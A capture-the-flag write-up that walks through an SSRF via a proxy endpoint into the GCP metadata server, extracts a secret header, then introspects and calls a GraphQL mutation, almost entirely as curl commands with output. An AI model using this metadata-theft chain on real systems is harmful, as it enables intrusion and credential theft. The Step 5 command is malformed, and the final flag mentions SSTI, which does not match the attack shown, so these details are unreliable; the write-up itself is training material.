# 🛰️ The Great Juche Jaguar GraphQL Heist — CTF Write-up

**Category:** Web Exploitation / SSRF / GraphQL  
**Points:** 300  

---

## 🎯 Challenge Summary

The Juche Jaguar intranet exposes a vulnerable proxy endpoint:
```
/proxy?url=
```
This can be abused to:
- Reach the Google Cloud metadata server
- Extract a one-time secret from the metadata
- Use that secret as a custom header to POST to `/graphql`
- Introspect the GraphQL schema to find a random mutation
- Execute the mutation and retrieve the flag

> Challenge Server: `http://34.86.186.68:8080`

---

## 🛠️ Tools Used
- `curl`
- `base64`
- Linux CLI
- `jq` (optional JSON parser)

---

## 🪜 Steps to Solve

### 🔹 Step 1: SSRF to Metadata Server
We started probing the GCP metadata server:
```
http://169.254.169.254/computeMetadata/v1/instance/attributes/
```
Using the proxy:
```bash
curl "http://34.86.186.68:8080/proxy?url=http%3A%2F%2F169.254.169.254%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2F" \
  -H "Metadata-Flavor: Google"
```
**Result:**
```
X-JJ-SECRET
ssh-keys
```

---

### 🔹 Step 2: Extract the Secret Header
```bash
curl "http://34.86.186.68:8080/proxy?url=http%3A%2F%2F169.254.169.254%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2FX-JJ-SECRET" \
  -H "Metadata-Flavor: Google"
```
**Response:**
```
S3NT1N3L
```

---

### 🔹 Step 3: GraphQL Schema Introspection
POST to `/graphql` using the secret:
```bash
curl -X POST http://34.86.186.68:8080/graphql \
  -H "X-JJ-SECRET: S3NT1N3L" \
  -H "Content-Type: application/json" \
  --data '{"query":"{ __schema { mutationType { fields { name } } } }"}'
```
**Result:** (base64-encoded)

```bash
echo 'eyJkYXRhIjp7Il9fc2NoZW1hIjp7Im11dGF0aW9uVHlwZSI6eyJmaWVsZHMiOlt7Im5hbWUiOiJtMzA5ZTUzMzYifV19fX19' | base64 -d
```
**Decoded:**
```
m309e5336
```

---

### 🔹 Step 4: Execute the Mutation
```bash
curl -X POST http://34.86.186.68:8080/graphql \
  -H "X-JJ-SECRET: S3NT1N3L" \
  -H "Content-Type: application/json" \
  --data '{"query":"mutation { m309e5336 }"}'
```
**Output:** Another base64-encoded flag response

---

### 🔹 Step 5: Decode the Flag
```bash
echo 'eyJkYXRhIjp7Im0zMDllNTMzNiI6IkMx...'} | base64 -d
```
✅ **Final Flag:**
```
C1{ssti_r3m0t3_c0d3_x3c}
```

---

## 🧠 Key Takeaways
- SSRF via query string (`/proxy?url=`)
- GCP internal metadata abuse
- Extracting secret headers via metadata attributes
- GraphQL introspection and schema discovery
- Dynamic mutation name detection
- Multi-step API exploitation

---

